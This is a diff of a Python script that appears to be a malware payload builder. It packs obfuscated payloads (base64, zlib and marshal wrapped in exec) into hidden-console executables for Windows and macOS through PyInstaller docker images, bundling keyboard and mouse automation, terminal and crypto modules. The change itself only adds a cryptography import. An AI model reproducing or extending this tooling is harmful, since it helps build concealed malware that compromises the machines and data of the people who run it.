@@ -314,7 +314,7 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
         try:
             if os_name == "Windows":
                 result = subprocess.run(
-                    f'docker run --platform linux/amd64 --env DISPLAY=$DISPLAY --volume "$(pwd)/{payload_file_name}:/src/" darkavengerreborn/pyinstaller-windows:latest "pyinstaller -F --onefile --windowed --icon=NONE --hidden-import=pypiwin32 --hidden-import=pycryptodome --hidden-import=pywinpty --hidden-import=pyautogui --version-file=version_info.txt --hide-console hide-early {payload_file_name}.py"',
+                    f'docker run --platform linux/amd64 --env DISPLAY=$DISPLAY --volume "$(pwd)/{payload_file_name}:/src/" darkavengerreborn/pyinstaller-windows:latest "pyinstaller -F --onefile --windowed --icon=NONE --hidden-import=pypiwin32 --hidden-import=pycryptodome --hidden-import=cryptography.hazmat.primitives.padding --hidden-import=pywinpty --hidden-import=pyautogui --version-file=version_info.txt --hide-console hide-early {payload_file_name}.py"',
                     shell=True,
                     capture_output=True,
                 )
@@ -338,7 +338,7 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
 
             elif os_name == "OSX":
                 result = subprocess.run(
-                    f'docker run --platform linux/amd64 --volume "$(pwd)/{payload_file_name}:/src/" darkavengerreborn/pyinstaller-osx:latest "pyinstaller -F --onefile --windowed --icon=NONE --hidden-import=pyautogui --hidden-import=pty --hide-console hide-early {payload_file_name}.py"',
+                    f'docker run --platform linux/amd64 --volume "$(pwd)/{payload_file_name}:/src/" darkavengerreborn/pyinstaller-osx:latest "pyinstaller -F --onefile --windowed --icon=NONE --hidden-import=pyautogui --hidden-import=cryptography.hazmat.primitives.padding --hidden-import=pty --hide-console hide-early {payload_file_name}.py"',
                     shell=True,
                     capture_output=True,
                 )
